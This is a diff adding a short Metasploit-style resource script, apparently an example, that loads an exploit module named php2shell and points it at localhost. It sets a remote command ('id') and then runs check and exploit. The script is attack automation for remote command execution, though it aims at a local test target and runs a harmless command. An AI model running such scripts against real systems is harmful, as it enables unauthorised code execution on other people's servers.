@@ -1,0 +1,8 @@
+# p2s.rc -- example resource script (msf-style commands, one per line)
+use exploit/php2shell/109619
+set RHOSTS 127.0.0.1
+set RPORT 19126
+set TARGET 8.4.26
+set CMD id
+check
+exploit
